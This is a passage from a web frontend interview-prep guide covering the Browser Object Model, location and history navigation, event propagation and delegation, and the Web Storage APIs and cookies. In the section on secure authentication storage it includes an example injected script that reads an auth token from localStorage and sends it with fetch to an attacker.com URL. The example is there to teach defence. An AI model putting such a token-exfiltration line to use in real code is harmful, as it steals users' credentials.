The safest approach is to avoid `innerHTML` for user-generated content entirely and use `textContent` (or a framework's default escaped text binding, like `{value}` in React) whenever you only need plain text — this is immune to XSS because no HTML is ever parsed. If rich HTML genuinely needs to be rendered, the content must be run through a trusted sanitization library like DOMPurify before being inserted, which strips dangerous tags and attributes like `<script>` and `onerror`. You should never build a custom sanitizer, and it's good practice to also sanitize on the server and set a Content Security Policy as an additional layer of defense.

---

### ❓ Follow-up Questions

- What is XSS, and what are the different types (stored, reflected, DOM-based)?
- Why is `dangerouslySetInnerHTML` named the way it is in React?
- What is a Content Security Policy, and how does it help mitigate XSS?
- Why is writing your own HTML sanitizer considered risky?

---

## Browser Object Model (BOM)

## 11. What is the Browser Object Model (BOM), how does it differ from the DOM, and what are the major BOM objects?

### 📖 Overview

The **Browser Object Model (BOM)** is the collection of objects, provided by the browser, that let JavaScript interact with the **browser window itself** — not the page's content, but things like the URL, browser history, screen size, and the browser/OS environment.

---

### ⚖️ DOM vs BOM

| DOM | BOM |
|-----|-----|
| Represents the **page's content** (HTML elements). | Represents the **browser window/environment** around the page. |
| Standardized by the W3C, consistent across browsers. | Not part of any single formal spec — grew organically, though modern browsers agree on the core API. |
| Accessed via `document`. | Accessed via `window` and its properties. |
| Example: `document.querySelector()` | Example: `window.location`, `window.history` |

> 💡 In practice, `document` is actually a **property of `window`** (`window.document`), so the DOM is technically nested inside the BOM. `window` is the global object in browsers — any global variable or function you declare is also a property of `window`.

---

### 🏗️ Major BOM Objects

| Object | Purpose |
|--------|---------|
| `window` | The global object — represents the browser tab/window itself; everything else hangs off it. |
| `location` | Info about and control over the current URL. |
| `history` | Access to the browser's session history (back/forward navigation). |
| `navigator` | Info about the browser and device (user agent, online status, geolocation, etc.). |
| `screen` | Info about the user's physical screen (resolution, available space). |
| `console` | Debugging/logging tools. |

We'll look at each of these in more detail in the next question.

---

### 🎤 Interview Answer

The Browser Object Model is the set of objects the browser provides for JavaScript to interact with the browser window and environment, as opposed to the DOM, which represents the page's actual content. The BOM includes objects like `window` (the global object everything else belongs to), `location` (the current URL), `history` (session navigation), `navigator` (browser/device info), and `screen` (physical display info). Unlike the DOM, the BOM isn't governed by one strict W3C standard, but modern browsers implement a largely consistent API. Technically, `document` (the DOM's entry point) is itself a property of `window`, so the DOM lives inside the BOM.

---

### ❓ Follow-up Questions

- Why is `document` considered part of both the DOM and the BOM?
- Is the BOM standardized like the DOM is?
- What global functions live directly on `window` (e.g. `setTimeout`, `alert`)?
- What happens if you declare a variable with `var` at the top level — does it become a property of `window`?

---

## 12. How do the `window`, `location`, `history`, `navigator`, `screen`, and `console` objects work, and what are their common real-world uses?

### 📖 Overview

Each BOM object exposes a different slice of information or control over the browser. Here's what each one does and how it's commonly used in real applications.

---

### ⚙️ `window`

The global object in the browser. Every global variable, every other BOM object, and every Web API (`setTimeout`, `fetch`, `alert`) hangs off `window`.

```js
window.innerWidth;   // viewport width in pixels
window.innerHeight;  // viewport height in pixels
window.open("https://example.com"); // open a new tab/window
window.close();      // close the current window (only works on windows opened by script)
window.alert("Hi");  // same as just calling alert("Hi") — alert is a window method
```

**Real-world use**: Responsive layout logic based on `window.innerWidth`, opening popups (e.g., OAuth login flows), or listening for window-level events like `resize` and `scroll`.

---

### ⚙️ `location`

Represents and controls the current URL.

```js
location.href;      // full URL
location.protocol;  // "https:"
location.host;      // "example.com:8080"
location.hostname;  // "example.com"
location.pathname;  // "/products/42"
location.search;    // "?sort=price"
location.hash;       // "#reviews"
```

**Real-world use**: Reading query parameters, redirecting users after login, building "share this page" links.

We cover navigation methods (`href`, `assign()`, `replace()`, `reload()`) in detail in Question 13.

---

### ⚙️ `history`

Gives access to the browser's session navigation stack (the pages the user visited in this tab).

```js
history.back();      // go back one page, same as clicking the browser's back button
history.forward();   // go forward one page
history.go(-2);      // go back two pages

history.pushState({ page: 1 }, "", "/page-1"); // change the URL without reloading
history.replaceState({ page: 1 }, "", "/page-1"); // like pushState, but replaces current entry
```

**Real-world use**: `pushState`/`replaceState` are the foundation of client-side routing in Single Page Applications (React Router, etc.) — they let the URL change to reflect the current view without a full page reload.

---

### ⚙️ `navigator`

Provides information about the browser and the user's device/environment.

```js
navigator.userAgent;   // browser/OS identification string
navigator.language;    // e.g. "en-US"
navigator.onLine;       // true/false — is the device connected to a network
navigator.geolocation.getCurrentPosition(successCb, errorCb); // ask for GPS location
navigator.clipboard.writeText("Copied!"); // write to the system clipboard
```

**Real-world use**: Detecting offline status to show a "you're offline" banner, copy-to-clipboard buttons, requesting location for a store locator.

---

### ⚙️ `screen`

Provides information about the user's physical display (not the browser window/viewport — the actual monitor).

```js
screen.width;        // full screen width in pixels
screen.height;        // full screen height in pixels
screen.availWidth;    // screen width minus OS taskbars/docks
screen.availHeight;
```

**Real-world use**: Rare in typical apps, but used for things like positioning a new popup window in the center of the physical screen, or adapting behavior for very small/large displays.

---

### ⚙️ `console`

The developer-facing logging and debugging API.

```js
console.log("info");
console.warn("careful");
console.error("something broke");
console.table(arrayOfObjects); // renders as a table in DevTools
console.group("Group Label");  // groups subsequent logs, collapsible in DevTools
console.time("label"); console.timeEnd("label"); // measure how long code takes
```

**Real-world use**: Debugging during development. Note that `console` output is generally stripped or gated in production builds since it's not meant for end users.

---

### ⚖️ Quick Summary Table

| Object | What it exposes | Common use |
|--------|-------------------|------------|
| `window` | The global environment | Viewport size, popups, global events |
| `location` | Current URL | Reading params, redirects |
| `history` | Navigation stack | SPA routing without reloads |
| `navigator` | Browser/device info | Online status, clipboard, geolocation |
| `screen` | Physical display info | Positioning windows, rare edge cases |
| `console` | Debugging tools | Development-time logging |

---

### 🎤 Interview Answer

`window` is the global object everything else in the browser hangs off of, including viewport size and global methods like `setTimeout`. `location` gives you the current URL and lets you navigate. `history` gives access to the tab's navigation stack, and its `pushState`/`replaceState` methods are what power client-side routing in SPAs by changing the URL without a full reload. `navigator` exposes information about the browser and device, like online status, clipboard access, and geolocation. `screen` describes the user's physical monitor, which is rarely needed outside of window-positioning edge cases. `console` is the developer debugging API used during development, not meant for end-user-facing output.

---

### ❓ Follow-up Questions

- How does `pushState()` change the URL without triggering a page reload?
- What's the difference between `window.innerWidth` and `screen.width`?
- How would you detect if a user goes offline?
- Why shouldn't production code rely on `console.log` for anything functional?

---

## 13. How does the `location` object work, and what is the difference between `href`, `assign()`, `replace()`, and `reload()`?

### 📖 Overview

`location` is both a **readable object** (giving you pieces of the current URL) and a set of **navigation methods**. The four ways to navigate — setting `href`, calling `assign()`, calling `replace()`, and calling `reload()` — look similar but behave differently, especially regarding **browser history**.

---

### ⚙️ Reading the URL

```js
// For https://example.com:8080/products/42?sort=price#reviews

location.href;      // "https://example.com:8080/products/42?sort=price#reviews" (the whole URL)
location.protocol;  // "https:"
location.host;      // "example.com:8080"
location.hostname;  // "example.com"
location.port;      // "8080"
location.pathname;  // "/products/42"
location.search;    // "?sort=price"
location.hash;       // "#reviews"
```

---

### ⚙️ Navigating: `href` vs `assign()` vs `replace()` vs `reload()`

```js
location.href = "https://example.com/new-page"; // navigate to a new URL
location.assign("https://example.com/new-page"); // same effect as setting href
location.replace("https://example.com/new-page"); // navigate WITHOUT keeping current page in history
location.reload();                                  // reload the current page
```

| Method | Adds a new History entry? | "Back" button returns to the old page? |
|--------|---------------------------|------------------------------------------|
| `location.href = "..."` | ✅ Yes | ✅ Yes |
| `location.assign("...")` | ✅ Yes | ✅ Yes |
| `location.replace("...")` | ❌ No — replaces current entry | ❌ No — the old page is gone from history |
| `location.reload()` | No new entry (same page) | N/A |

`location.href` and `location.assign()` behave **identically** — both navigate to a new URL and push a new entry onto the browser's history stack, so the user can click "Back" to return to the current page.

`location.replace()` is different: it swaps out the **current** history entry instead of adding a new one. After using `replace()`, clicking "Back" skips the page that called it entirely.

---

### 🎯 When to Use `replace()`

Common real-world cases:

- **Post-login redirects**: after logging in, redirect from `/login` to `/dashboard` using `replace()` so the user can't hit "Back" and land on the login form again (and potentially resubmit a form).
- **Redirect chains**: if `/old-url` should always redirect to `/new-url`, use `replace()` so the browser history doesn't fill up with the intermediate redirect page.

```js
// After successful login:
location.replace("/dashboard"); // user can't navigate "back" to the login page
```

---

### ⚙️ `reload()`

```js
location.reload(); // reloads the current page from cache if possible
```

Reloads the current URL. In older, non-standard implementations a boolean argument (`reload(true)`) was used to try to force bypassing the cache, but this isn't part of the standard and shouldn't be relied on — use cache-control headers or a cache-busting query param instead if you need to guarantee a fresh fetch.

---

### 🌍 Real-World Example

Think of browser history like a stack of physical photos you're flipping through.

- `href` / `assign()` is like **adding a new photo** on top of the stack — flipping back reveals the previous one underneath.
- `replace()` is like **swapping out the top photo** for a new one — flipping back skips straight past it to whatever was underneath before.

---

### 🎤 Interview Answer

`location.href` and `location.assign()` both navigate to a new URL and push a new entry onto the browser's history stack, so the "Back" button returns to the previous page — they behave identically. `location.replace()` also navigates, but replaces the current history entry instead of adding a new one, so the page that called `replace()` is skipped when the user clicks "Back" — this is commonly used for post-login redirects so users can't navigate back to a login form. `location.reload()` simply reloads the current page. Understanding this difference matters because using the wrong one can create confusing "Back button" behavior for users.

---

### ❓ Follow-up Questions

- Why would you use `replace()` after a login redirect instead of `href`?
- What's the difference between `location.pathname` and `location.href`?
- How does `history.pushState()` differ from `location.assign()`?
- Does `location.reload()` guarantee a fresh network request, or can it use the cache?

---

## Events

## 14. What are Events, Event Listeners, and `addEventListener()`, and how does the browser dispatch events?

### 📖 Overview

An **Event** is a signal that something has happened — a user clicked, typed, scrolled, or a resource finished loading. An **Event Listener** is a function you register to run when a specific event happens on a specific element. `addEventListener()` is the standard method for registering one.

---

### ⚙️ Basic Usage

```js
const button = document.querySelector("button");

function handleClick(event) {
  console.log("Clicked!", event);
}

button.addEventListener("click", handleClick);

// Remove it later:
button.removeEventListener("click", handleClick);
```

> 💡 To remove a listener with `removeEventListener()`, you must pass the **same function reference** used in `addEventListener()`. An anonymous inline function (`addEventListener("click", () => {...})`) can never be removed, because there's no reference to it afterward.

---

### ⚙️ The Event Object

Every listener receives an **Event object** as its first argument, containing details about what happened:

```js
button.addEventListener("click", (event) => {
  event.type;       // "click"
  event.target;     // the actual element that triggered the event
  event.currentTarget; // the element the listener is attached to
  event.clientX;    // mouse X position (for mouse events)
  event.key;        // the key pressed (for keyboard events)
});
```

We cover `target` vs `currentTarget` and propagation in detail in Question 15.

---

### ⚙️ `addEventListener()` Options

```js
element.addEventListener("click", handler, {
  once: true,      // automatically remove the listener after it fires once
  capture: true,    // listen during the capturing phase instead of bubbling (see Q15)
  passive: true,    // promise the browser you won't call preventDefault() (see Q17)
});
```

---

### ⚙️ How the Browser Dispatches Events Internally

1. A real-world action occurs (click, keypress, network event, etc.).
2. The browser creates an **Event object** describing it.
3. The browser determines the **target** — the specific element the action happened on (e.g., the exact button clicked).
4. The event travels through the DOM tree in three phases: **Capturing** (top-down, from `window` to the target), **Target** (at the element itself), and **Bubbling** (bottom-up, from the target back to `window`). This full journey is covered in Question 15.
5. Along this path, the browser calls every matching listener registered for that event type, in the order they were added (respecting the `capture` option).

---

### ⚖️ Old-Style Handlers vs `addEventListener()`

```js
// ❌ Old style — only one handler allowed per event per element
button.onclick = handlerA;
button.onclick = handlerB; // overwrites handlerA!

// ✅ addEventListener — multiple handlers can coexist
button.addEventListener("click", handlerA);
button.addEventListener("click", handlerB); // both run
```

`addEventListener()` is preferred because it allows multiple independent listeners on the same event, supports the capture phase, and supports options like `once` and `passive`.

---

### 🎤 Interview Answer

An event is a notification that something happened — a click, a keypress, a page load. `addEventListener()` registers a function to run when that event occurs on a given element, and it's preferred over the old `element.onclick = fn` style because it allows multiple independent listeners on the same element and event, and supports options like `once`, `capture`, and `passive`. Internally, when an action happens, the browser creates an event object, determines the exact target element, and dispatches the event through a capturing phase (top-down), the target phase, and a bubbling phase (bottom-up), calling every registered listener along that path.

---

### ❓ Follow-up Questions

- Why can't you remove a listener added as an anonymous arrow function?
- What's the difference between `event.target` and `event.currentTarget`?
- What does the `once: true` option do?
- Why would you use the capturing phase instead of the default bubbling phase?

---

## 15. What are Event Propagation, Event Bubbling, Event Capturing, `event.target`, `event.currentTarget`, `preventDefault()`, and `stopPropagation()`?

### 📖 Overview

When an event happens on an element nested inside other elements, it doesn't just fire on that one element — it travels through the DOM tree. This journey is called **Event Propagation**, and it has two directions: **Capturing** and **Bubbling**.

---

### 🏗️ The Three Phases

```
        window
          │
     Capturing Phase (top → down)
          │
          ▼
        <div>
          │
          ▼
        <ul>
          │
          ▼
        <li>  ◀── Target Phase (event fires here)
          │
     Bubbling Phase (bottom → up)
          │
          ▼
        window
```

1. **Capturing Phase**: The event starts at `window` and travels **down** through ancestors toward the target element.
2. **Target Phase**: The event reaches the actual element that was interacted with.
3. **Bubbling Phase**: The event then travels back **up** through the same ancestors, from the target to `window`.

By default, `addEventListener()` listens during the **bubbling** phase. Pass `{ capture: true }` to listen during the capturing phase instead.

```js
parent.addEventListener("click", handler, { capture: true }); // fires during capturing (going down)
parent.addEventListener("click", handler); // fires during bubbling (going up) — default
```

---

### ⚙️ `event.target` vs `event.currentTarget`

```html
<ul id="list">
  <li>Item 1</li>
  <li>Item 2</li>
</ul>
```

```js
document.getElementById("list").addEventListener("click", (event) => {
  console.log(event.target);        // the exact <li> that was clicked
  console.log(event.currentTarget); // the <ul> — the element the listener is attached to
});
```

| Property | Meaning |
|----------|---------|
| `event.target` | The actual, most specific element where the event **originated**. |
| `event.currentTarget` | The element the **listener itself is attached to** — changes as the event bubbles/captures through different listeners. |

This distinction is the foundation of Event Delegation, covered in Question 16.

---

### ⚙️ `stopPropagation()`

Stops the event from continuing its journey (capturing or bubbling) to other elements.

```js
child.addEventListener("click", (event) => {
  event.stopPropagation(); // parent's click listener will NOT fire
});

parent.addEventListener("click", () => {
  console.log("This won't run if child stopped propagation");
});
```

> 💡 `stopImmediatePropagation()` goes a step further — it also prevents **other listeners on the same element** from running, not just listeners on ancestor/descendant elements.

---

### ⚙️ `preventDefault()`

Stops the browser's **default behavior** for that event — it does **not** stop propagation.

```js
form.addEventListener("submit", (event) => {
  event.preventDefault(); // stops the page from reloading/navigating on form submit
  // ...handle the form with JavaScript instead
});

link.addEventListener("click", (event) => {
  event.preventDefault(); // stops the browser from navigating to the link's href
});
```

| Method | What it stops |
|--------|-----------------|
| `preventDefault()` | The browser's built-in default action (form submit, link navigation, checkbox toggling, etc.) |
| `stopPropagation()` | The event from reaching other elements in the capturing/bubbling path |

These are independent — you can call one, both, or neither, depending on what you need.

---

### 🌍 Real-World Example

Imagine dropping a pebble in a pond (target phase), where the ripples travel both outward (bubbling) from the point of impact and could also be thought of as approaching from the shore inward beforehand (capturing) — event listeners at any "ring" (ancestor element) can react as the ripple passes through their position.

---

### 🎤 Interview Answer

Event propagation is the journey an event takes through the DOM: first the capturing phase, top-down from `window` to the target; then the target phase; then the bubbling phase, bottom-up back to `window`. `addEventListener()` listens on the bubbling phase by default, unless you pass `{ capture: true }`. `event.target` is the exact element the event originated from, while `event.currentTarget` is the element the currently-running listener is attached to — they differ when a listener on a parent handles an event that started on a child. `stopPropagation()` halts the event's journey to other elements, while `preventDefault()` cancels the browser's built-in default behavior for that event, like a form submitting or a link navigating — the two are unrelated and can be used independently.

---

### ❓ Follow-up Questions

- Why does `addEventListener` default to the bubbling phase instead of capturing?
- What's the difference between `stopPropagation()` and `stopImmediatePropagation()`?
- Can you call `preventDefault()` on every event type?
- How does `event.target` change as an event bubbles up through nested elements?

---

## 16. What is Event Delegation, how does it work internally, why does it improve performance, and when should it be used?

### 📖 Overview

**Event Delegation** is a pattern where, instead of attaching a listener to **every** individual child element, you attach **one** listener to a common **parent**, and use event bubbling plus `event.target` to figure out which specific child was actually interacted with.

---

### ⚙️ Without Delegation (the naive approach)

```js
// ❌ One listener per row — expensive for large lists
document.querySelectorAll(".list-item").forEach((item) => {
  item.addEventListener("click", () => {
    console.log("Clicked:", item.textContent);
  });
});
```

Problems with this approach:

- For 1,000 list items, you create 1,000 separate listeners.
- Every new item added dynamically needs its **own new listener** attached manually.
- More memory usage and more setup work.

---

### ⚙️ With Delegation

```js
// ✅ One listener on the parent, works for all current AND future children
document.getElementById("list").addEventListener("click", (event) => {
  const item = event.target.closest(".list-item");
  if (!item) return; // click wasn't on a list item (or its descendant)

  console.log("Clicked:", item.textContent);
});
```

`event.target` gives the exact element clicked (which might be a `<span>` or `<img>` inside the `<li>`, not the `<li>` itself). `.closest(".list-item")` walks up from `target` to find the nearest matching ancestor, correctly identifying which "row" was clicked regardless of which inner element was actually hit.

---

### 🏗️ How It Works Internally

Event Delegation relies entirely on **bubbling** (Question 15):

```
Click on <span> inside <li> inside <ul>
        │
        ▼
Event fires on <span> (target phase, event.target = <span>)
        │
        ▼
Bubbles up to <li>
        │
        ▼
Bubbles up to <ul>  ◀── Our single listener is here, catches the bubbled event
        │
        ▼
Continues bubbling to <body>, <html>, window
```

The listener on `<ul>` sees every click that happens anywhere inside it, because the event bubbles up to it. It then uses `event.target` (and often `.closest()`) to determine exactly what was clicked.

---

### ⚖️ Why It Improves Performance

| Without Delegation | With Delegation |
|----------------------|-------------------|
| One listener per element (e.g., 1,000 for 1,000 rows) | One listener total, regardless of row count |
| New elements need listeners manually attached | New elements work automatically — no extra setup |
| Higher memory usage | Lower memory usage |
| Removing elements requires manually removing their listeners (or risking memory leaks) | Nothing to clean up per element |

---

### 🎯 When Should It Be Used?

- **Large or dynamic lists** — tables, comment sections, todo lists — where items are added/removed frequently.
- Whenever you'd otherwise be attaching the **same handler logic** to many similar elements.

### ⚠️ When It's Not a Good Fit

- Events that **don't bubble** (e.g., `focus`, `blur`, `mouseenter`, `mouseleave` in their original form — though modern code can use the bubbling equivalents `focusin`, `focusout`, `mouseover`, `mouseout` instead).
- When you need very specific, isolated behavior per element that doesn't map cleanly to a shared handler.

---

### 🌍 Real-World Example

Imagine a large office building with a **single receptionist** at the entrance (the parent listener) instead of a separate security guard posted at every office door (individual listeners). Anyone entering any office has to pass by the entrance, so the receptionist can identify who's going where just by watching who walks past — much more efficient than staffing every door.

---

### 🎤 Interview Answer

Event delegation is attaching a single event listener to a common parent element instead of separate listeners on each child, relying on the fact that events bubble up from the child to the parent. Inside the parent's listener, `event.target` tells you exactly which child element triggered the event (often combined with `.closest()` to find the right ancestor). This improves performance because you have one listener instead of potentially thousands, uses less memory, and automatically works for elements added to the DOM later without needing to attach new listeners. It's ideal for large or dynamic lists, but doesn't work well for non-bubbling events like `focus`/`blur` in their original form.

---

### ❓ Follow-up Questions

- Why doesn't event delegation work with events like `focus` and `blur`?
- What does `.closest()` do, and why is it useful in delegation?
- How does delegation automatically handle dynamically added elements?
- What would happen if you called `stopPropagation()` on a child's click inside a delegated setup?

---

## 17. What are passive event listeners, and what are common mistakes developers make while handling events?

### 📖 Overview

A **passive event listener** is one that tells the browser upfront: "I promise not to call `preventDefault()`," which allows the browser to optimize certain interactions — most importantly, scrolling — without waiting to see if your handler will block it.

---

### ⚙️ Passive Event Listeners

```js
element.addEventListener("touchstart", handler, { passive: true });
element.addEventListener("wheel", handler, { passive: true });
```

**Why this matters**: Events like `touchstart`, `touchmove`, and `wheel` can be used to block scrolling by calling `event.preventDefault()` inside the handler (e.g., to implement a custom swipe gesture). Because of this possibility, browsers historically had to **wait** for your handler to finish running before starting to scroll, in case it called `preventDefault()`. On slow handlers, this caused noticeably janky scrolling.

With `{ passive: true }`, you're telling the browser your handler will never call `preventDefault()`, so the browser can **start scrolling immediately**, in parallel with running your handler, instead of waiting.

> 💡 Many browsers now default `touchstart`/`touchmove` listeners to passive automatically for performance, but explicitly marking your own listeners as `passive: true` (when you truly don't need `preventDefault()`) is still good practice and required in some contexts.

> ⚠️ If you mark a listener `passive: true` and then call `preventDefault()` inside it anyway, the browser will typically ignore the call and may log a warning — the promise you made is enforced.

---

### ⚠️ Common Event-Handling Mistakes

#### 1. Not Removing Listeners (Memory Leaks)

```js
// ❌ Listener stays attached even after the element/component is removed
function setup() {
  document.addEventListener("scroll", expensiveHandler);
}
```

If a component is destroyed (e.g., in a single-page app) without removing its listeners, the listener — and everything it references via closure — stays in memory indefinitely.

```js
// ✅ Clean up when no longer needed
function setup() {
  document.addEventListener("scroll", expensiveHandler);
  return () => document.removeEventListener("scroll", expensiveHandler);
}
```

#### 2. Attaching a New Listener Instead of Reusing One

```js
// ❌ Adds a NEW listener every time this runs — they pile up
function attach() {
  button.addEventListener("click", () => console.log("clicked"));
}
```

Because the callback is a new anonymous function each time, `addEventListener` can't recognize it as a duplicate — it just keeps adding more listeners.

#### 3. Not Debouncing/Throttling High-Frequency Events

```js
// ❌ Fires dozens of times per second, each doing expensive work
window.addEventListener("resize", () => {
  recalculateExpensiveLayout();
});
```

Events like `scroll`, `resize`, `mousemove`, and `input` can fire very rapidly — handlers doing heavy work on every firing can hurt performance badly. Debounce or throttle these.

#### 4. Forgetting `event.target` vs `event.currentTarget` in Delegation

Using `event.target` directly without `.closest()` when the click could land on a nested child element (like an icon inside a button), leading to bugs where the "wrong" element seems to have been clicked.

#### 5. Blocking Scroll Performance with Non-Passive Listeners

Attaching `touchstart`/`wheel` listeners without `{ passive: true }` when `preventDefault()` is never actually called, causing unnecessary scroll jank.

#### 6. Relying on `event.which` / `event.keyCode`

These are deprecated. Use `event.key` or `event.code` instead for keyboard events.

```js
// ❌ Deprecated
if (event.keyCode === 13) { /* Enter */ }

// ✅ Modern
if (event.key === "Enter") { /* Enter */ }
```

---

### 🎤 Interview Answer

A passive event listener, set via `{ passive: true }`, tells the browser the handler will never call `preventDefault()`, letting the browser start scrolling immediately instead of waiting to see if the handler blocks it — this matters most for `touchstart`, `touchmove`, and `wheel` listeners. Common event-handling mistakes include forgetting to remove listeners when they're no longer needed (causing memory leaks), accidentally attaching duplicate anonymous-function listeners instead of reusing one reference, not debouncing/throttling high-frequency events like scroll or resize, using `event.target` without `.closest()` in delegated handlers, and using deprecated properties like `keyCode` instead of `event.key`.

---

### ❓ Follow-up Questions

- Why does `{ passive: true }` improve scroll performance specifically?
- What happens if you call `preventDefault()` inside a passive listener?
- How would you detect a memory leak caused by un-removed event listeners?
- What's the difference between debouncing and throttling a scroll handler?

---

## Storage APIs

## 18. What are `localStorage`, `sessionStorage`, and Cookies, how do they differ, and when should each be used?

### 📖 Overview

Browsers give web pages three main ways to persist small amounts of data on the user's device: **`localStorage`**, **`sessionStorage`**, and **Cookies**. They differ in **how long data lasts**, **whether it's sent to the server**, and **how much space they offer**.

---

### ⚙️ `localStorage`

Stores data with **no expiration date** — it persists even after the browser is closed and reopened, until explicitly cleared (by code or the user).

```js
localStorage.setItem("theme", "dark");
localStorage.getItem("theme");   // "dark"
localStorage.removeItem("theme");
localStorage.clear();            // removes everything
```

Data is scoped per **origin** (protocol + domain + port) — a page on `https://example.com` cannot read `localStorage` set by `https://other.com`.

---

### ⚙️ `sessionStorage`

Works exactly like `localStorage` (same API), but data is cleared automatically when the **tab is closed**. It's also scoped per-tab — even two tabs open to the same site have separate `sessionStorage`.

```js
sessionStorage.setItem("draft", "Hello");
sessionStorage.getItem("draft");
```

---

### ⚙️ Cookies

Small pieces of data (historically capped around 4KB) that are attached to every matching HTTP request sent to the server, unless the `document.cookie` API is used from JavaScript.

```js
document.cookie = "username=John; expires=Fri, 31 Dec 2026 23:59:59 GMT; path=/";
console.log(document.cookie); // "username=John" (only readable if not HttpOnly)
```

Cookies can have an expiration date (persistent) or none (session cookie, cleared when the browser closes) — this is set explicitly, unlike `localStorage`/`sessionStorage` where the behavior is fixed by which API you use.

---

### ⚖️ Comparison Table

| Feature | `localStorage` | `sessionStorage` | Cookies |
|---------|-----------------|-------------------|---------|
| Persistence | Until manually cleared | Until tab is closed | Configurable (session or expiry date) |
| Sent to server automatically? | ❌ No | ❌ No | ✅ Yes, with every matching request |
| Storage size | ~5-10MB (varies by browser) | ~5-10MB | ~4KB |
| Scope | Per origin | Per origin + per tab | Per domain (configurable path) |
| Accessible via JavaScript | ✅ Yes | ✅ Yes | ✅ Yes, unless `HttpOnly` is set |

---

### 🎯 When to Use Each

| Use Case | Best Choice |
|----------|--------------|
| Remembering a user's theme preference across visits | `localStorage` |
| Storing form data temporarily while filling a multi-step wizard in one tab | `sessionStorage` |
| Data the **server** needs on every request (e.g., session ID, auth token in some setups) | Cookies |
| Any highly sensitive data (auth tokens) that shouldn't be exposed to JavaScript at all | `HttpOnly` Cookies (see Question 20) |

---

### 🎤 Interview Answer

`localStorage` and `sessionStorage` share the same simple key-value API, but `localStorage` persists indefinitely until cleared, while `sessionStorage` is cleared when the tab closes and is scoped per-tab. Neither is automatically sent to the server — you have to read and send them manually. Cookies, on the other hand, are small (about 4KB), can have a configurable expiration, and — critically — are automatically attached to every matching HTTP request to the server, which makes them the right tool when the server itself needs to see the data on each request, such as session identifiers.

---

### ❓ Follow-up Questions

- Why are cookies automatically sent with requests, but `localStorage` is not?
- What happens to `sessionStorage` data if you duplicate a tab?
- What's the maximum realistic size you should store in `localStorage`?
- Why might cookies be a better choice than `localStorage` for authentication?

---

## 19. How do Storage APIs work, what data types can they store, what are their limitations, and how do you store JavaScript objects?

### 📖 Overview

`localStorage` and `sessionStorage` (together called the **Web Storage API**) provide a simple **synchronous, key-value** store. Despite their simplicity, they come with important limitations worth knowing.

---

### ⚙️ The API

```js
localStorage.setItem("key", "value");
localStorage.getItem("key");      // "value" or null if not found
localStorage.removeItem("key");
localStorage.clear();
localStorage.key(0);              // get the key name at index 0
localStorage.length;              // number of stored items
```

---

### ⚠️ Data Type Limitation: Strings Only

The Web Storage API can **only store strings**. If you pass any other type, it gets converted using `.toString()` — which usually isn't what you want.

```js
localStorage.setItem("count", 5);
localStorage.getItem("count"); // "5" — a string, not a number!

localStorage.setItem("user", { name: "Alice" });
localStorage.getItem("user"); // "[object Object]" — data is LOST!
```

---

### ✅ Storing Objects: `JSON.stringify()` / `JSON.parse()`

To store structured data, you must manually **serialize** it to a JSON string, and **parse** it back when reading:

```js
const user = { name: "Alice", age: 25 };

localStorage.setItem("user", JSON.stringify(user));

const stored = JSON.parse(localStorage.getItem("user"));
console.log(stored.name); // "Alice"
```

> ⚠️ Always guard against `null`/invalid JSON when reading, since the key might not exist yet or might contain unexpected data:

```js
function getUser() {
  try {
    const raw = localStorage.getItem("user");
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null; // handles corrupted/invalid JSON gracefully
  }
}
```

---

### ⚠️ Other Limitations

| Limitation | Detail |
|------------|--------|
| **Synchronous** | All Web Storage operations block the main thread. Storing large amounts of data can cause jank. |
| **Storage limit** | Roughly 5-10MB per origin (varies by browser) — much smaller than IndexedDB. |
| **Strings only** | Requires manual `JSON.stringify`/`JSON.parse` for objects/arrays. |
| **No expiration** (`localStorage`) | Data lives forever until explicitly removed — can accumulate stale data over time. |
| **No querying** | It's a flat key-value store — no way to search/filter without loading and checking everything manually. |
| **Not shared across origins** | Strictly scoped per origin (protocol + domain + port); `http://` and `https://` versions of the same domain are different origins. |
| **Not available in some contexts** | e.g., disabled in private/incognito mode in some older browsers, or blocked entirely if third-party storage is restricted in an iframe. |

For anything beyond simple key-value pairs — larger datasets, need for querying, or asynchronous access — **IndexedDB** is the more appropriate browser storage API.

---

### 🎤 Interview Answer

The Web Storage API (`localStorage`/`sessionStorage`) is a simple, synchronous key-value store that can only hold strings — storing a number or object directly converts it to a string like `"[object Object]"`, losing the data. To store structured data, you serialize it with `JSON.stringify()` before saving and parse it back with `JSON.parse()` when reading, wrapped in error handling since the value might not exist or might be corrupted. Its main limitations are that it's synchronous (can block the main thread for large data), limited to roughly 5-10MB, offers no querying capability, and is strictly scoped per origin. For larger or more structured storage needs, IndexedDB is the better choice.

---

### ❓ Follow-up Questions

- What happens if you call `JSON.parse()` on invalid or corrupted data?
- Why is Web Storage synchronous, and why can that be a problem?
- When would you reach for IndexedDB instead of localStorage?
- Is `localStorage` shared between `http://example.com` and `https://example.com`?

---

## 20. Why shouldn't sensitive information be stored in `localStorage`, what are HttpOnly Cookies, and how should authentication data be stored securely?

### 📖 Overview

`localStorage` is fully accessible to **any JavaScript running on the page** — including malicious scripts injected via an XSS vulnerability. This makes it a poor choice for storing sensitive data like authentication tokens. **HttpOnly cookies** solve this by making the cookie **invisible to JavaScript entirely**.

---

### ⚠️ The Problem: `localStorage` and XSS

If an attacker manages to inject and run JavaScript on your page (via XSS — see Question 10), that script has **full read access** to `localStorage`, exactly like your own application code does.

```js
// Malicious injected script — has the same access as your own app code
const stolenToken = localStorage.getItem("authToken");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: stolenToken,
});
```

There's no built-in way to make part of `localStorage` "off-limits" to scripts running on the page — if your app's JavaScript can read it, so can an attacker's injected script.

---

### ✅ HttpOnly Cookies

An **HttpOnly cookie** is a cookie set with a special flag that makes it **completely inaccessible to JavaScript** (`document.cookie` simply won't show it), while still being automatically sent by the browser with matching HTTP requests.

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

This cookie is set by the **server** (via the `Set-Cookie` response header) — JavaScript on the page cannot set or read an `HttpOnly` cookie at all, which means even a successful XSS attack **cannot steal it**.

| Flag | Purpose |
|------|---------|
| `HttpOnly` | Blocks all JavaScript access — the cookie is invisible to `document.cookie`. |
| `Secure` | Cookie is only sent over HTTPS connections, never plain HTTP. |
| `SameSite=Strict` / `Lax` | Restricts the cookie from being sent on cross-site requests, mitigating CSRF attacks. |

---

### ⚖️ `localStorage` vs `HttpOnly` Cookie for Auth Tokens

| Feature | `localStorage` | `HttpOnly` Cookie |
|---------|-----------------|---------------------|
| Accessible to JavaScript | ✅ Yes (vulnerable to XSS theft) | ❌ No |
| Automatically sent to server | ❌ No (must attach manually) | ✅ Yes |
